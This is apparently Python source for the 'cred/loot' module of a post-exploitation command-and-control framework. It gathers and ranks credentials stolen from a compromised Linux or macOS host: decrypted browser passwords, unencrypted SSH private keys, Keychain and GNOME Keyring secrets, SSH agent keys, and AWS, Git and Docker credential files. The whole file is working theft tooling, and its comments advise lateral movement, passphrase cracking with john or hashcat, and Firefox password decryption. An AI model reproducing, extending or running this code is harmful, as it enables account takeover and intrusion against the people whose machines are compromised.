"""Unified credential harvest report — correlates all cred modules.

Runs cred/browser, cred/keychain, and cred/memory in sequence, then
correlates their findings into a prioritized, operator-ready report.

Finding priorities
------------------
CRITICAL — Credentials usable immediately, no cracking required
HIGH     — High-value credential data requiring one additional step
MEDIUM   — Credential metadata or low-confidence indicators
LOW      — Supporting intelligence (key topology, authorized users)

Remote execution note
---------------------
When bundled for remote C2 execution (via ursa_post_dispatch), sub-module
imports may fail in minimal beacon environments.  Failed modules are listed
in ``data["module_errors"]`` and remaining findings are still returned.

Platform: Linux, macOS (darwin).
"""

from __future__ import annotations

from post.base import ModuleResult, PostModule
from post.loader import register

# ── Severity constants ─────────────────────────────────────────────────────────

CRITICAL = "CRITICAL"
HIGH     = "HIGH"
MEDIUM   = "MEDIUM"
LOW      = "LOW"

_SEVERITY_ORDER: dict[str, int] = {CRITICAL: 0, HIGH: 1, MEDIUM: 2, LOW: 3}

# Credential files that almost always contain plaintext secrets
_HIGH_VALUE_CRED_FILES = {
    ".aws/credentials",
    ".netrc",
    ".git-credentials",
    "gh/hosts.yml",       # ~/.config/gh/hosts.yml
    ".docker/config.json",
}

# Credential files that are config-like but may contain tokens
_MEDIUM_VALUE_CRED_FILES = {
    ".kube/config",
}


# ── Helpers ────────────────────────────────────────────────────────────────────

def _safe_run(module_name: str) -> tuple[dict, str]:
    """Run a named post module; return (data_dict, error_str)."""
    try:
        from post.loader import _REGISTRY, PostLoader  # noqa: PLC0415

        PostLoader._discover()
        if module_name not in _REGISTRY:
            return {}, f"module not registered: {module_name!r}"
        result = _REGISTRY[module_name]().run({})
        if not result.ok:
            return result.data, result.error or f"{module_name} returned ok=False"
        return result.data, ""
    except Exception as exc:  # noqa: BLE001
        return {}, f"{type(exc).__name__}: {exc}"


def _finding(severity: str, category: str, title: str, detail: str = "") -> dict:
    return {"severity": severity, "category": category, "title": title, "detail": detail}


def _is_real_password(pw: str) -> bool:
    """Return True if the password string looks like an actual decrypted credential."""
    if not pw:
        return False
    bad = ("[error", "[decrypt", "(encrypted", "(needs nss", "[not", "?")
    pl = pw.lower()
    return not any(pl.startswith(b) for b in bad)


def _classify_cred_file(path: str) -> str:
    """Return 'high', 'medium', or 'low' for a credential file path."""
    for pattern in _HIGH_VALUE_CRED_FILES:
        if pattern in path:
            return "high"
    for pattern in _MEDIUM_VALUE_CRED_FILES:
        if pattern in path:
            return "medium"
    return "low"


# ── Correlation logic ──────────────────────────────────────────────────────────

def _correlate_creds(
    browser: dict,
    keychain: dict,
    memory: dict,
) -> list[dict]:
    """Produce a sorted list of finding dicts from the three cred module data dicts.

    Each argument is the ``data`` dict returned by the corresponding cred module.
    Missing or empty dicts produce no findings — graceful degradation.
    """
    findings: list[dict] = []
    add = findings.append

    # ── CRITICAL ──────────────────────────────────────────────────────────────

    # Cleartext browser passwords that were successfully decrypted
    all_creds = browser.get("credentials", [])
    cleartext_creds = [
        c for c in all_creds
        if "error" not in c and _is_real_password(c.get("password", ""))
    ]
    if cleartext_creds:
        sample = "; ".join(
            f"{c.get('browser', '?')}:{c.get('url', '?')[:40]} ({c.get('username', '?')})"
            for c in cleartext_creds[:3]
        )
        suffix = f" (+{len(cleartext_creds) - 3} more)" if len(cleartext_creds) > 3 else ""
        add(_finding(
            CRITICAL, "browser",
            f"Cleartext browser passwords decrypted ({len(cleartext_creds)} credentials)",
            f"Sample: {sample}{suffix}",
        ))

    # Unencrypted SSH private keys on disk
    unencrypted_keys = memory.get("unencrypted_private_keys", [])
    if unencrypted_keys:
        key_list = ", ".join(unencrypted_keys[:4])
        suffix = f" (+{len(unencrypted_keys) - 4} more)" if len(unencrypted_keys) > 4 else ""
        add(_finding(
            CRITICAL, "ssh",
            f"Unencrypted SSH private keys on disk ({len(unencrypted_keys)} files)",
            f"Keys: {key_list}{suffix} — copy and use directly for lateral movement.",
        ))

    # macOS: keychain secrets actually retrieved in plaintext
    retrieved = keychain.get("retrieved", [])
    if retrieved:
        svc_list = ", ".join(r.get("service", "?") for r in retrieved[:4])
        suffix = f" (+{len(retrieved) - 4} more)" if len(retrieved) > 4 else ""
        add(_finding(
            CRITICAL, "keychain",
            f"macOS Keychain secrets retrieved in plaintext ({len(retrieved)} entries)",
            f"Services: {svc_list}{suffix}",
        ))

    # Linux: GNOME Keyring secrets accessible (items with a non-error secret)
    ss_items = keychain.get("secretstorage_items", [])
    ss_ok = [i for i in ss_items if "error" not in i and i.get("secret")]
    if ss_ok:
        labels = ", ".join(i.get("service", "?") for i in ss_ok[:4])
        suffix = f" (+{len(ss_ok) - 4} more)" if len(ss_ok) > 4 else ""
        add(_finding(
            CRITICAL, "keychain",
            f"GNOME Keyring secrets accessible in plaintext ({len(ss_ok)} items)",
            f"Labels: {labels}{suffix}",
        ))

    # ── HIGH ──────────────────────────────────────────────────────────────────

    # Browser credential entries (URL + username visible even without decryption)
    total_browser = browser.get("count", len(all_creds))
    if total_browser > 0 and not cleartext_creds:
        # Only emit this if we didn't already emit the CRITICAL cleartext finding
        browsers_seen: dict[str, int] = {}
        for c in all_creds:
            b = c.get("browser", "?")
            browsers_seen[b] = browsers_seen.get(b, 0) + 1
        browser_summary = ", ".join(f"{k} ({v})" for k, v in list(browsers_seen.items())[:4])
        add(_finding(
            HIGH, "browser",
            f"Browser credential entries found ({total_browser} total)",
            f"Browsers: {browser_summary} — username/URL visible; decrypt passwords with cred/browser.",
        ))
    elif total_browser > 0 and cleartext_creds:
        # Cleartext CRITICAL already covers this; emit HIGH for the remainder
        non_cleartext = total_browser - len(cleartext_creds)
        if non_cleartext > 0:
            add(_finding(
                HIGH, "browser",
                f"Additional browser entries with encrypted passwords ({non_cleartext} remaining)",
                "URLs and usernames are visible; passwords need further decryption.",
            ))

    # SSH agent loaded keys (in-memory, immediately usable for auth/forwarding)
    agent_keys = [k for k in memory.get("agent_keys", []) if "error" not in k]
    if agent_keys:
        key_strs = ", ".join(
            f"{k.get('key_type', '?')} {k.get('comment', '')}" for k in agent_keys[:4]
        )
        suffix = f" (+{len(agent_keys) - 4} more)" if len(agent_keys) > 4 else ""
        add(_finding(
            HIGH, "ssh",
            f"SSH agent has {len(agent_keys)} loaded key(s) in memory",
            f"Keys: {key_strs}{suffix} — use SSH_AUTH_SOCK for passwordless auth.",
        ))

    # High-value credential files on disk
    cred_files = keychain.get("credential_files", [])
    high_files = [f for f in cred_files if _classify_cred_file(f.get("path", "")) == "high"]
    if high_files:
        paths = ", ".join(f["path"] for f in high_files[:5])
        suffix = f" (+{len(high_files) - 5} more)" if len(high_files) > 5 else ""
        add(_finding(
            HIGH, "files",
            f"High-value credential files present ({len(high_files)} files)",
            f"Files (likely plaintext): {paths}{suffix}",
        ))

    # Encrypted SSH private keys (crackable or usable if passphrase is known)
    enc_priv = [
        k for k in memory.get("key_files", [])
        if k.get("type") == "private_key" and k.get("encrypted") is True
    ]
    if enc_priv:
        paths = ", ".join(k["path"] for k in enc_priv[:3])
        suffix = f" (+{len(enc_priv) - 3} more)" if len(enc_priv) > 3 else ""
        add(_finding(
            HIGH, "ssh",
            f"Encrypted SSH private key files ({len(enc_priv)} found)",
            f"Keys: {paths}{suffix} — crack passphrase with john/hashcat `--format=SSH`.",
        ))

    # ── MEDIUM ────────────────────────────────────────────────────────────────

    # macOS keychain metadata (accounts/services visible, no secrets yet)
    kc_items = keychain.get("items", [])
    if kc_items and not retrieved:
        # Only surface as MEDIUM if we didn't already pull plaintext secrets
        svc_sample = ", ".join(
            i.get("service") or i.get("server") or i.get("account") or "?"
            for i in kc_items[:5]
            if i.get("service") or i.get("server") or i.get("account")
        )
        add(_finding(
            MEDIUM, "keychain",
            f"macOS Keychain metadata found ({len(kc_items)} items with account/service info)",
            f"Sample services/servers: {svc_sample}",
        ))

    # Medium-value config files (kubeconfig etc.)
    med_files = [f for f in cred_files if _classify_cred_file(f.get("path", "")) == "medium"]
    if med_files:
        paths = ", ".join(f["path"] for f in med_files[:3])
        add(_finding(
            MEDIUM, "files",
            f"Credential config files present ({len(med_files)} files)",
            f"Files: {paths}",
        ))

    # GNOME keyring is locked or secretstorage unavailable
    ss_errors = [i for i in ss_items if "error" in i]
    if ss_errors and not ss_ok:
        err_msg = ss_errors[0].get("error", "unknown error")
        add(_finding(
            MEDIUM, "keychain",
            "GNOME Keyring found but not accessible",
            f"Reason: {err_msg} — try unlocking the desktop session.",
        ))

    # Firefox entries (URL + count visible; passwords encrypted with NSS)
    firefox_creds = [c for c in all_creds if c.get("browser", "").startswith("Firefox")]
    if firefox_creds:
        profiles = sorted({c.get("profile", "?") for c in firefox_creds})
        add(_finding(
            MEDIUM, "browser",
            f"Firefox credentials found ({len(firefox_creds)} entries, {len(profiles)} profile(s))",
            "Passwords encrypted with NSS — use firepwd.py or firefox_decrypt to extract.",
        ))

    # ── LOW ───────────────────────────────────────────────────────────────────

    # known_hosts entries — reveals internal infrastructure
    known_hosts_files = [k for k in memory.get("key_files", []) if k.get("type") == "known_hosts"]
    for kh in known_hosts_files:
        n = kh.get("hosts", "?")
        add(_finding(
            LOW, "ssh",
            f"known_hosts file has {n} entries — reveals network infrastructure",
            f"File: {kh['path']}",
        ))

    # authorized_keys — reveals who can authenticate
    auth_key_files = [k for k in memory.get("key_files", []) if k.get("type") == "authorized_keys"]
    for ak in auth_key_files:
        n = ak.get("entries", "?")
        add(_finding(
            LOW, "ssh",
            f"authorized_keys has {n} entries — reveals authorized identities",
            f"File: {ak['path']}",
        ))

    # SSH public keys — useful for correlation
    pub_keys = [k for k in memory.get("key_files", []) if k.get("type") == "public_key"]
    if pub_keys:
        paths = ", ".join(k["path"] for k in pub_keys[:3])
        add(_finding(
            LOW, "ssh",
            f"SSH public key files found ({len(pub_keys)})",
            f"Files: {paths}",
        ))

    # Sort by severity then title
    findings.sort(key=lambda f: (_SEVERITY_ORDER.get(f["severity"], 9), f["title"]))
    return findings


# ── Module ─────────────────────────────────────────────────────────────────────

@register
class CredLootModule(PostModule):
    NAME = "cred/loot"
    DESCRIPTION = (
        "Unified credential harvest: runs cred/browser, cred/keychain, cred/memory "
        "and correlates findings into a prioritized CRITICAL/HIGH/MEDIUM/LOW summary"
    )
    PLATFORM    = ["linux", "darwin"]
    IMPLEMENTED = True

    def run(self, args: dict | None = None) -> ModuleResult:  # noqa: ARG002
        # ── Run all three cred modules ────────────────────────────────────────
        module_data:   dict[str, dict] = {}
        module_errors: dict[str, str]  = {}

        for name in ("cred/browser", "cred/keychain", "cred/memory"):
            data, err = _safe_run(name)
            module_data[name] = data
            if err:
                module_errors[name] = err

        browser  = module_data.get("cred/browser",  {})
        keychain = module_data.get("cred/keychain", {})
        memory   = module_data.get("cred/memory",   {})

        # ── Correlate ─────────────────────────────────────────────────────────
        findings = _correlate_creds(browser, keychain, memory)

        # ── Build human-readable output ───────────────────────────────────────
        import socket as _socket  # noqa: PLC0415
        try:
            hostname = _socket.getfqdn()
        except Exception:  # noqa: BLE001
            hostname = "?"

        import os as _os  # noqa: PLC0415
        try:
            import pwd as _pwd  # noqa: PLC0415
            username = _pwd.getpwuid(_os.getuid()).pw_name
        except Exception:  # noqa: BLE001
            username = str(_os.getuid())

        counts = {
            CRITICAL: sum(1 for f in findings if f["severity"] == CRITICAL),
            HIGH:     sum(1 for f in findings if f["severity"] == HIGH),
            MEDIUM:   sum(1 for f in findings if f["severity"] == MEDIUM),
            LOW:      sum(1 for f in findings if f["severity"] == LOW),
        }
        count_str = (
            f"{counts[CRITICAL]}C / {counts[HIGH]}H / "
            f"{counts[MEDIUM]}M / {counts[LOW]}L"
        )

        header = [
            "=" * 64,
            f"  CREDENTIAL HARVEST — {hostname}",
            f"  User   : {username}",
            f"  Modules: {len(module_data)} run, {len(module_errors)} errors",
            f"  Findings: {len(findings)} total  [{count_str}]",
            "=" * 64,
        ]

        body: list[str] = []
        for sev, label in [
            (CRITICAL, "■ CRITICAL"),
            (HIGH,     "■ HIGH"),
            (MEDIUM,   "■ MEDIUM"),
            (LOW,      "■ LOW"),
        ]:
            tier = [f for f in findings if f["severity"] == sev]
            if not tier:
                continue
            body.append(f"\n{label} ({len(tier)})")
            body.append("-" * 40)
            for f in tier:
                body.append(f"  [{f['category']}] {f['title']}")
                if f["detail"]:
                    body.append(f"    → {f['detail']}")

        if not findings:
            body.append("\n  No credential findings detected.")

        if module_errors:
            body.append("\n⚠ Module errors (partial results):")
            for mod, err in module_errors.items():
                body.append(f"  {mod}: {err}")

        output = "\n".join(header + body)

        # Assemble a flat credential inventory for machine-readable consumption
        browser_creds  = browser.get("credentials", [])
        cleartext      = [c for c in browser_creds if _is_real_password(c.get("password", ""))]
        agent_keys     = [k for k in memory.get("agent_keys", []) if "error" not in k]
        unenc_keys     = memory.get("unencrypted_private_keys", [])
        retrieved_kc   = keychain.get("retrieved", [])
        ss_accessible  = [i for i in keychain.get("secretstorage_items", []) if "error" not in i]
        high_files     = [
            f["path"] for f in keychain.get("credential_files", [])
            if _classify_cred_file(f.get("path", "")) == "high"
        ]

        return ModuleResult(
            ok=True,
            output=output,
            data={
                "hostname":          hostname,
                "username":          username,
                "findings":          findings,
                "finding_counts":    counts,
                "module_errors":     module_errors,
                # Flat credential inventory
                "inventory": {
                    "cleartext_browser_creds":  cleartext,
                    "browser_cred_count":        len(browser_creds),
                    "unencrypted_ssh_keys":      unenc_keys,
                    "ssh_agent_keys":            agent_keys,
                    "keychain_retrieved":        retrieved_kc,
                    "secretstorage_accessible":  ss_accessible,
                    "high_value_cred_files":     high_files,
                },
                "raw": {
                    "browser":  browser,
                    "keychain": keychain,
                    "memory":   memory,
                },
            },
        )
